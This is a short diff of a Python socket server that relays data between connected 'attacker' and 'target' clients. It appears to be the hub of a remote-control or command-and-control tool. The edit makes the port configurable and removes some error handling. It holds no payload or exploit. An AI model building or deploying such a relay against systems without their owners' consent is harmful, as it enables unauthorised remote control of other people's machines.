@@ -11,9 +11,9 @@ TARGET_TO_ATTACKETS = {}
 
 
 class Server():
-    def __init__(self):
+    def __init__(self, Port):
         self.server_socket = socket.socket()
-        self.server_socket.bind(("0.0.0.0", 8000))
+        self.server_socket.bind(("0.0.0.0", Port))
         self.server_socket.listen(100)
         self.printing_opening()
         print("Listening for clients...\n")
@@ -140,12 +140,9 @@ class Main():
             data = SuperSocket(self.client).recv_msg()
             try:
                 if self.client in TARGET_LIST:
-                    try:
                         for socket in TARGET_TO_ATTACKETS[self.client]:
                             SuperSocket(socket).send_msg(data)
                             
-                    except:
-                        pass
                         
                 elif self.client in ATTACKER_LIST:
                     
@@ -165,11 +162,8 @@ class Main():
                         break
                         
                     else:
-                        try:
                             SuperSocket(ATTACKER_TO_TARGET[self.client]).send_msg(data)
                         
-                        except:
-                            pass
                 else:
                     pass
             except:
